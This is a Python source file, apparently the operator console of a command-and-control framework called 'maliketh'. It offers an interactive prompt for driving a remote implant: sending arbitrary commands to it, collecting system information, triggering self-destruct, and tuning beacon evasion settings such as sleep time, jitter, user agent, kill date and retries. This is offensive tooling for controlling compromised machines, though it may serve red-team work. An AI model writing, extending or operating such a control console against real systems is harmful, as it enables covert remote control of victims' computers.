import datetime
from typing import Any, List, Optional, Tuple
from prompt_toolkit import print_formatted_text, HTML, PromptSession
from prompt_toolkit.shortcuts import prompt
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style
from tabulate import tabulate
from .style import PROMPT_STYLE
from config import OperatorConfig
from .completer import InteractCompleter
from .commands import INTERACT_COMMANDS, COMMANDS, walk_dict
from .logging import get_styled_logger
from comms import add_task, get_implant_profile, kill_implant, update_implant_profile
from opcodes import Opcodes

logger = get_styled_logger()


def interact_prompt(config: OperatorConfig, implant_id: str):
    from .cli import bottom_bar

    session = PromptSession(
        message=HTML(
            f"<warning>maliketh</warning> (<home>{config.name}</home>) - <interact>{implant_id[0:8]}</interact> > "
        ),
        style=PROMPT_STYLE,
        enable_history_search=True,
        completer=InteractCompleter,
        bottom_toolbar=bottom_bar(config),
        auto_suggest=AutoSuggestFromHistory(),
    )

    while True:
        try:
            text = session.prompt()
            cmd, *args = text.split(" ")
            if handle(cmd, args, config, implant_id):
                break
        except KeyboardInterrupt:
            continue
        except EOFError:
            break


def handle(cmd: str, args: List[str], config: OperatorConfig, implant_id: str) -> None | bool:
    """
    Handle a command
    """
    if cmd in ["help", "h", "?"]:
        handle_help(args[0] if len(args) > 0 else None)
    elif cmd == "exit":
        handle_exit(config)
    elif cmd == "cmd":
        handle_cmd(config, implant_id, args)
    elif cmd == "config":
        handle_config(config, implant_id, args)
    elif cmd == "selfdestruct":
        handle_selfdestruct(config, implant_id)
        return True
    elif cmd == "sysinfo":
        handle_sysinfo(config, implant_id)
    elif cmd == "back":
        return True
    elif cmd == "clear":
        print("\033[H\033[J")
    elif cmd.strip() == "":
        pass
    else:
        logger.error(f"Command {cmd} not found")


def handle_help(args: Optional[str]) -> None:
    """
    Handle the help command
    """
    if args is None:
        print("Available commands:\n")
        walk_dict(INTERACT_COMMANDS)

        print()
    else:
        if INTERACT_COMMANDS.get(args):
            walk_dict(INTERACT_COMMANDS[args])
        else:
            logger.error(f"Command {args} not found")


def handle_exit(config: OperatorConfig) -> None:
    """
    Handle the exit command, jump back to the main loop
    """
    from .cli import main_loop
    main_loop(config)

def handle_cmd(config: OperatorConfig, implant_id: str, args: List[str]) -> None:
    """
    Handle the cmd command, send a command to the implant
    """
    if len(args) < 1:
        logger.error("Please provide a command to send")
        return

    logger.info(f"Sending command `{' '.join(args)}` to {implant_id}")
    add_task(config, Opcodes.CMD.value, implant_id, args)

def handle_config(config: OperatorConfig, implant_id: str, args: List[str]) -> None:

    if len(args) < 2:
        logger.error("Please provide an action to perform and a key")
        return
    action, key = args[0], args[1]
    changes = {}
    valid_keys = [k.split(' ')[0] for k in INTERACT_COMMANDS['config']['set'].keys()]

    if action == "set":
        if len(args) < 3:
            logger.error("Please provide a key and value to set")
            return
        value = args[2]
        if key in valid_keys:
            valid, typed_value = validate_config_set(key, value)
            if valid:
                changes[key] = typed_value
                logger.info(f"Setting `{key}` to `{value}`")
                update_implant_profile(config, implant_id, changes)
        else:
            logger.error(f"Invalid key `{key}`")
    elif action == "show":
        if len(args) < 2:
            logger.error("Please provide a key to show")
            return
        implant_config = get_implant_profile(config, implant_id)
        if key == "all":
            print(tabulate(implant_config.items(), headers=["Key", "Value"], tablefmt="fancy_grid"))
        elif key in INTERACT_COMMANDS['config']['show']:
            print(tabulate([[key, implant_config[key]]], headers=["Key", "Value"], tablefmt="fancy_grid"))
        else:
            logger.error(f"Invalid key {key}")
    else:
        logger.error("Invalid action, must be set or show")
        return

def handle_selfdestruct(config: OperatorConfig, implant_id: str) -> None:
    """
    Handle the selfdestruct command, send a selfdestruct task to the implant
    """
    logger.debug(f"Sending selfdestruct task to {implant_id}")
    kill_implant(config, implant_id)


################################
## Helper functions
################################

def validate_config_set(key: str, value: str) -> Tuple[bool, Any]:
    if key == "user_agent":
        return True, value
    elif key == "sleep_time":
        if value.isdigit():
            return True, int(value)
        else:
            logger.error("Sleep time must be an integer")
            return False, None
    elif key == "kill_date":
        try:
            return True, datetime.datetime.strptime(value, '%Y-%m-%d')
        except ValueError:
            logger.error("Kill date must be in the format YYYY-MM-DD")
            return False, None
    elif key == "jitter":
        # Check if jitter is a float
        try:
            return True, float(value)
        except ValueError:
            logger.error("Jitter must be a float")
            return False, None
    elif key == "max_retries":
        if value.isdigit():
            return True, int(value)
        else:
            logger.error("Max retries must be an integer")
            return False, None
    elif key == "auto_self_destruct":
        try:
            return True, bool(value)
        except ValueError:
            logger.error("Auto self destruct must be a boolean")
            return False, None
    elif key == "retry_wait":
        try:
            return True, int(value)
        except ValueError:
            logger.error("Retry wait must be an int")
            return False, None
    elif key == "retry_jitter":
        try:
            return True, float(value)
        except ValueError:
            logger.error("Retry jitter must be a float")
            return False, None
    elif key == "tailoring_hash_function":
        if value in ["sha256", "md5"]:
            return True, value
    elif key == "tailoring_hash_rounds":
        if value.isdigit() and int(value) > 0:
            return True, int(value)
        else:
            logger.error("Tailoring hash rounds must be a positive integer")
            return False, None
    else:
        logger.error(f"Invalid key {key}")
        return False, None
    
    return False, None

def handle_sysinfo(config: OperatorConfig, implant_id: str) -> None:
    """
    Handle the sysinfo command, send a sysinfo task to the implant
    """
    logger.debug(f"Sending sysinfo task to {implant_id}")
    add_task(config, Opcodes.SYSINFO.value, implant_id, [])